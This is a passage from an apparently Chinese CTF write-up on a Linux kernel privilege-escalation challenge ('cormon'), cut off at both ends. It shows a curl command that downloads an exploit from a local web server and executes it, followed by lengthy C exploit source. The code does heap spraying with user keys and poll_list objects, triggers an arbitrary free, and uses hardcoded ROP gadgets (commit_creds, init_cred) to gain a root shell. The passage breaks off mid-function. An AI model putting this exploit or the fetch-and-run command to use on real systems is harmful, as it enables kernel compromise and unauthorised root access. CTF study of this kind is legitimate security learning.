命令，因此可以在题目所在文件夹下创建 web 服务。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure></div> 然后利用
<code>curl</code> 下载 exp 并执行。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">curl 192.168.64.149:8000/exp -o /tmp/exp &amp;&amp; chmod +x /tmp/exp &amp;&amp; /tmp/exp</span><br></pre></td></tr></table></figure></div> <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">randint</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + (rand() % (max - min));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line"><span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_dir_mapping_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFF888000000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFc87FFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INVALID_KERNEL_OFFSET 0x1145141919810</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> kernel_addr_list[] = &#123;</span><br><span class="line">        <span class="number">0xffffffff813275c0</span>,</span><br><span class="line">        <span class="number">0xffffffff812d4320</span>,</span><br><span class="line">        <span class="number">0xffffffff812d4340</span>,</span><br><span class="line">        <span class="number">0xffffffff812d4330</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">kernel_offset_query</span><span class="params">(<span class="type">size_t</span> kernel_text_leak)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_kernel_text_addr(kernel_text_leak)) &#123;</span><br><span class="line">        <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(kernel_addr_list) / <span class="keyword">sizeof</span>(kernel_addr_list[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!((kernel_text_leak ^ kernel_addr_list[i]) &amp; <span class="number">0xFFF</span>) &amp;&amp; (kernel_text_leak - kernel_addr_list[i]) % <span class="number">0x100000</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> kernel_text_leak - kernel_addr_list[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] unknown kernel addr: %#lx\n&quot;</span>, kernel_text_leak);</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">search_kernel_offset</span><span class="params">(<span class="type">void</span> *buf, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> *search_buf = buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="type">size_t</span> kernel_offset = kernel_offset_query(search_buf[i]);</span><br><span class="line">        <span class="keyword">if</span> (kernel_offset != INVALID_KERNEL_OFFSET) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel leak addr: %#lx\n&quot;</span>, search_buf[i]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %#lx\n&quot;</span>, kernel_offset);</span><br><span class="line">            <span class="keyword">return</span> kernel_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> INVALID_KERNEL_OFFSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nfds, timer;</span><br><span class="line">&#125; poll_args;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">entries</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="type">size_t</span> poll_threads, poll_cnt;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">alloc_poll_list</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> nfds = ((poll_args *) args)-&gt;nfds;</span><br><span class="line">    <span class="type">int</span> timer = ((poll_args *) args)-&gt;timer;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> *<span class="title">pfds</span> =</span> <span class="built_in">calloc</span>(nfds, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nfds; i++) &#123;</span><br><span class="line">        pfds[i].fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">        pfds[i].events = POLLERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;mutex);</span><br><span class="line">    poll_threads++;</span><br><span class="line">    pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">    poll(pfds, nfds, timer);</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;mutex);</span><br><span class="line">    poll_threads--;</span><br><span class="line">    pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_STACK_PPS 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POLL_NUM 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> poll_tid[POLL_NUM];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_poll_thread</span><span class="params">(<span class="type">size_t</span> size, <span class="type">int</span> timer)</span> &#123;</span><br><span class="line">    poll_args *args = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(poll_args));</span><br><span class="line">    args-&gt;nfds = (size - (size + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list)) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd) + N_STACK_PPS;</span><br><span class="line">    args-&gt;timer = timer;</span><br><span class="line">    pthread_create(&amp;poll_tid[poll_cnt++], <span class="number">0</span>, alloc_poll_list, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">wait_poll_start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (poll_threads != poll_cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">join_poll_threads</span><span class="params">(<span class="type">void</span> (*confuse)(<span class="type">void</span> *), <span class="type">void</span> *confuse_args)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; poll_threads; i++) &#123;</span><br><span class="line">        pthread_join(poll_tid[i], <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (confuse != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            confuse(confuse_args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    poll_cnt = poll_threads = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __aligned(x)                    __attribute__((__aligned__(x)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_NUM 199</span></span><br><span class="line"><span class="type">int</span> key_id[KEY_NUM];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">int</span> payload_len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> description[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(description, <span class="string">&quot;%d&quot;</span>, id);</span><br><span class="line">    <span class="keyword">return</span> key_id[id] = syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, payload_len - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload), KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">size_t</span> plen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, key_id[id], payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *bufer, <span class="type">size_t</span> buflen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, key_id[id], bufer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, key_id[id], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, key_id[id], KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_bufer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * -&gt;confirm() verifies that the data in the pipe bufer is there</span></span><br><span class="line"><span class="comment">     * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">     * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">     * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">     * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When the contents of this pipe bufer has been completely</span></span><br><span class="line"><span class="comment">     * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Attempt to take ownership of the pipe bufer and its contents.</span></span><br><span class="line"><span class="comment">     * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">     * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">     * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">     * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">     * cache.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Get a reference to the pipe bufer.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *args[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEQ_NUM (2048 + 128)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_NUM 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cormon_fd;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seq_confuse</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> push_rsi_pop_rsp_ret = <span class="number">0xFFFFFFFF817AD641</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8116926d</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8245A960</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF810EBA40</span>;</span><br><span class="line"><span class="type">size_t</span> pop_r14_pop_r15_ret = <span class="number">0xffffffff81001615</span>;</span><br><span class="line"><span class="type">size_t</span> find_task_by_vpid = <span class="number">0xFFFFFFFF810E4FC0</span>;</span><br><span class="line"><span class="type">size_t</span> init_fs = <span class="number">0xFFFFFFFF82589740</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff8101f5fc</span>;</span><br><span class="line"><span class="type">size_t</span> add_rax_rcx_ret = <span class="number">0xffffffff8102396f</span>;</span><br><span class="line"><span class="type">size_t</span> mov_mmrax_rbx_pop_rbx_ret = <span class="number">0xffffffff817e1d6d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rbx_ret = <span class="number">0xffffffff811bce34</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_ret = <span class="number">0xffffffff81a05418</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81c00f97</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, (<span class="type">void</span> *) get_shell);</span><br><span class="line"></span><br><span class="line">    cormon_fd = open(<span class="string">&quot;/proc_rw/cormon&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (cormon_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open cormon.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset;</span><br><span class="line">    <span class="type">int</span> target_key;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saturating kmalloc-32 partial slabs...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_NUM];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (seq_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;[-] failed to open stat.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">2048</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying user keys in kmalloc-32...&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; KEY_NUM; j++) &#123;</span><br><span class="line">                setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;sky123&quot;</span>, buf, <span class="number">32</span>, XATTR_CREATE);</span><br><span class="line">                key_alloc(j, buf, <span class="number">32</span>);</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">72</span>) &#123;</span><br><span class="line">                    bind_core(<span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;[*] Creating poll threads...&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">14</span>; k++) &#123;</span><br><span class="line">                        create_poll_thread(PAGE_SIZE + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd), <span class="number">3000</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    bind_core(<span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">                    wait_poll_start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Corrupting poll_list next pointer...&quot;</span>);</span><br><span class="line">            write(cormon_fd, buf, PAGE_SIZE);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Triggering arbitrary free...&quot;</span>);</span><br><span class="line">            join_poll_threads(seq_confuse, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Overwriting user key size / Spraying seq_operations structures...&quot;</span>);</span><br><span class="line">        